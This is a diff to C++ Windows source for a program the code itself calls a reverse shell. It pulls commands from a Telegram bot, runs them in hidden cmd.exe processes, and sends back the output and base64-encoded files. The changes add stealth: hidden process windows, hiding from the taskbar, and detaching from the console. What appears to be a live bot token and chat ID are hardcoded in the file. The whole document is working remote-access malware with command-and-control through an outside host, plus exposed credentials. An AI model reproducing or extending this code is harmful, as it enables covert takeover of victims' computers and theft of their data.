@@ -26,9 +26,9 @@
 
 namespace fs = std::filesystem;
 
-// Telegram Bot Token (ODI4NzM4NDU2NTpBQUUtd2g0Ql9lZVREUUJ5ZkxfbTVlOWFtOW5iUUtIQnpiRQ==)
+// Telegram Bot Token
 const std::string BOT_TOKEN = "8287384565:AAE-wh4B_eeTDQBeyf_m5e9am9nbQKHBzbE";
-const std::string CHAT_ID = "7369364451"; // Target chat ID
+const std::string CHAT_ID = "7369364451";
 const std::string API_URL = "https://api.telegram.org/bot";
 
 class StringUtils {
@@ -157,8 +157,6 @@ public:
     }
     
     bool sendFile(const std::string& filename, const std::vector<BYTE>& data) {
-        // Simple implementation - for production you'd use multipart form data
-        // For brevity, we'll use base64 encoding in message
         std::string encoded = StringUtils::base64Encode(data);
         std::string message = "📁 File: " + filename + "\n\n[Base64 encoded]\n" + 
             encoded.substr(0, 3000) + (encoded.length() > 3000 ? "..." : "");
@@ -169,7 +167,6 @@ public:
         std::vector<std::string> commands;
         std::string response = httpRequest("getUpdates?timeout=5");
         
-        // Simple parsing - in production use JSON parser
         size_t pos = 0;
         std::string textMarker = "\"text\":\"";
         while ((pos = response.find(textMarker, pos)) != std::string::npos) {
@@ -259,13 +256,47 @@ public:
         std::string result;
         char buffer[4096];
         
-        FILE* pipe = _popen(cmd.c_str(), "r");
-        if (!pipe) return "Error executing command";
+        // Use CREATE_NO_WINDOW flag to prevent console window from showing
+        SECURITY_ATTRIBUTES sa = {0};
+        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+        sa.bInheritHandle = TRUE;
         
-        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-            result += buffer;
+        HANDLE hRead, hWrite;
+        CreatePipe(&hRead, &hWrite, &sa, 0);
+        
+        STARTUPINFOA si = {0};
+        si.cb = sizeof(STARTUPINFOA);
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;  // Hide the window
+        si.hStdOutput = hWrite;
+        si.hStdError = hWrite;
+        si.hStdInput = NULL;
+        
+        PROCESS_INFORMATION pi = {0};
+        
+        // Use cmd.exe with /c to execute command
+        std::string fullCmd = "cmd.exe /c " + cmd;
+        
+        if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE, 
+            CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
+            
+            CloseHandle(hWrite);
+            
+            DWORD bytesRead;
+            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+                buffer[bytesRead] = '\0';
+                result += buffer;
+            }
+            
+            WaitForSingleObject(pi.hProcess, 5000); // Wait up to 5 seconds
+            
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            result = "Failed to execute command";
         }
-        _pclose(pipe);
+        
+        CloseHandle(hRead);
         
         if (result.empty()) {
             result = "[Command executed with no output]";
@@ -336,7 +367,6 @@ private:
                 
                 std::this_thread::sleep_for(std::chrono::seconds(2));
             } catch (...) {
-                // Silently handle errors
                 std::this_thread::sleep_for(std::chrono::seconds(5));
             }
         }
@@ -349,8 +379,12 @@ public:
     void start() {
         running = true;
         
-        // Hide console window
+        // Hide console window immediately
         HWND hWnd = GetConsoleWindow();
+        ShowWindow(hWnd, SW_HIDE);
+        
+        // Also hide from taskbar
+        SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
         ShowWindow(hWnd, SW_HIDE);
         
         // Send initial notification
@@ -368,20 +402,40 @@ public:
     }
 };
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Hide console
+// Function to detach from console completely
+void DetachFromConsole() {
+    FreeConsole();
+    
+    // Also detach if it's a GUI app
     HWND hWnd = GetConsoleWindow();
-    ShowWindow(hWnd, SW_HIDE);
+    if (hWnd) {
+        ShowWindow(hWnd, SW_HIDE);
+        FreeConsole();
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Detach from console completely
+    DetachFromConsole();
+    
+    // If compiled as GUI app, this should already be hidden, but just in case
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) {
+        ShowWindow(hWnd, SW_HIDE);
+        FreeConsole();
+    }
     
     // Initialize Winsock
     WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return 1;
+    }
     
     // Start reverse shell
     ReverseShell shell(BOT_TOKEN, CHAT_ID);
     shell.start();
     
-    // Message loop
+    // Message loop (doesn't create visible window)
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
